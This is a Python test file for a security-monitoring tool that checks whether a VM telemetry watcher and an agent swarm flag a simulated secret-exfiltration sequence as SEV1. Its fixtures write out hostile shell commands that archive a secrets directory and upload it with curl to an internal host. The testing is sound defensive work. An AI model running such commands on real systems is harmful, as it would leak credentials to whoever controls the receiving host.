import os
import time
from datetime import datetime, timedelta, timezone

from fastapi.testclient import TestClient

from vega import api
from vega.models import EventIn, Window
from vega.producers.vm_collector import VMTelemetryWatcher
from vega.state import VegaRuntimeState
from vega.streams import EventMapper, InMemoryStreamStore
from vega.swarm import (
    GeminiChannelScout,
    GeminiWindowCorrelator,
    HeuristicStructuredReasoner,
    SwarmWindowCoordinator,
)


def test_vm_collector_classifies_normal_tcp_connections(tmp_path, monkeypatch):
    snapshots = iter([
        set(),
        {("10.97.0.1", 8001), ("10.97.0.1", 8766), ("1.1.1.1", 443)},
    ])
    monkeypatch.setattr("vega.producers.vm_collector.read_established_tcp", lambda: next(snapshots))
    watcher = VMTelemetryWatcher(
        ingest_url="http://10.97.0.1:8001",
        source_id="vm-a",
        run_id="vm-test",
        secrets_dir=tmp_path / "secrets",
        tmp_dir=tmp_path,
        history_file=tmp_path / ".bash_history",
    )
    network = {payload["dst"]: payload for channel, payload in watcher.poll_once() if channel == "network"}
    assert set(network) == {"10.97.0.1:8766", "1.1.1.1:443"}
    assert network["10.97.0.1:8766"]["internal"] is True
    assert network["1.1.1.1:443"]["internal"] is False
    assert all(payload["unapproved_egress"] is False for payload in network.values())
    findings = HeuristicStructuredReasoner()._analyze_scout_chunk({
        "channel": "network",
        "events": [{"event_id": dst, "payload": payload} for dst, payload in network.items()],
    })
    assert findings == {"findings": []}


async def test_vm_collector_detects_exfil_sequence_and_triggers_sev1(tmp_path):
    secrets_dir = tmp_path / "secrets"
    secrets_dir.mkdir()
    secret_file = secrets_dir / "prod-api.key"
    secret_file.write_text("SYNTHETIC-KEY-001\n", encoding="utf-8")
    # Set initial atime slightly in the past so reading bumps it cleanly
    past = time.time() - 10
    os.utime(secret_file, (past, past))

    tmp_dir = tmp_path / "tmp"
    tmp_dir.mkdir()
    history_file = tmp_path / ".bash_history"
    history_file.write_text("ls\n", encoding="utf-8")

    watcher = VMTelemetryWatcher(
        ingest_url="http://10.97.0.1:8000",
        source_id="vm-a",
        run_id="vm-test",
        secrets_dir=secrets_dir,
        tmp_dir=tmp_dir,
        history_file=history_file,
    )

    # 1. Simulate reading secret file (bump atime)
    now_ts = time.time()
    os.utime(secret_file, (now_ts, past))

    # 2. Simulate hidden archive creation in /tmp
    archive = tmp_dir / ".cache-bundle.tar.gz"
    archive.write_bytes(b"fake-tar-gz-bytes" * 20)

    # 3. Simulate bash commands flushed to ~/.bash_history
    with open(history_file, "a", encoding="utf-8") as f:
        f.write("tar -czf /tmp/.cache-bundle.tar.gz /srv/secrets/prod-keys\n")
        f.write(f"curl -F file=@{archive} http://10.97.0.1:8443/upload\n")

    emitted = watcher.poll_once()
    channels = [ch for ch, _ in emitted]
    assert "file" in channels
    assert "process" in channels
    assert "network" in channels

    # Feed emitted events through EventMapper -> SwarmWindowCoordinator
    store = InMemoryStreamStore()
    mapper = EventMapper(store)
    runtime = VegaRuntimeState()
    t_start = datetime.now(timezone.utc) - timedelta(seconds=1)

    for idx, (ch, payload) in enumerate(emitted, start=1):
        _, stored = await mapper.ingest(
            EventIn(
                schema_version=1,
                run_id="vm-test",
                event_id=f"evt-vm-{idx}",
                source_id="vm-a",
                channel=ch,  # type: ignore[arg-type]
                event_time=datetime.now(timezone.utc),
                payload=payload,
            )
        )
        runtime.record_event(stored)

    reasoner = HeuristicStructuredReasoner()
    scouts = {
        ch: GeminiChannelScout(channel=ch, reasoner=reasoner)
        for ch in ("file", "network", "process")
    }
    coordinator = SwarmWindowCoordinator(
        store=store,
        scouts=scouts,
        correlator=GeminiWindowCorrelator(reasoner=reasoner),
        runtime=runtime,
    )
    window = Window(
        id="W-vm-test",
        start=t_start,
        end=datetime.now(timezone.utc) + timedelta(seconds=10),
    )
    result = await coordinator.process_window_detailed(window)
    assert result.signal is not None
    assert result.signal.severity == "SEV1"
    assert result.signal.source_ids == ["vm-a"]


def test_demo_exfil_sink_endpoint_and_url_detection(tmp_path):
    archive = tmp_path / ".cache-bundle.tar.gz"
    archive.write_bytes(b"0123456789")
    history_file = tmp_path / ".bash_history"
    history_file.write_text("", encoding="utf-8")

    watcher = VMTelemetryWatcher(
        ingest_url="http://10.97.0.1:8000",
        source_id="vm-a",
        run_id="vm-test",
        secrets_dir=tmp_path / "missing-secrets",
        tmp_dir=tmp_path,
        history_file=history_file,
    )

    with open(history_file, "a", encoding="utf-8") as f:
        f.write(f"curl -F file=@{archive} http://10.97.0.1:8000/api/demo/exfil-sink\n")

    emitted = watcher.poll_once()
    net_events = [payload for ch, payload in emitted if ch == "network"]
    assert len(net_events) == 1
    assert net_events[0]["unapproved_egress"] is True
    assert net_events[0]["bytes_out"] == 10

    with TestClient(api.app) as client:
        res = client.post("/api/demo/exfil-sink", content=b"0123456789")
        assert res.status_code == 200
        assert res.json() == {"status": "sink_received", "bytes": 10}
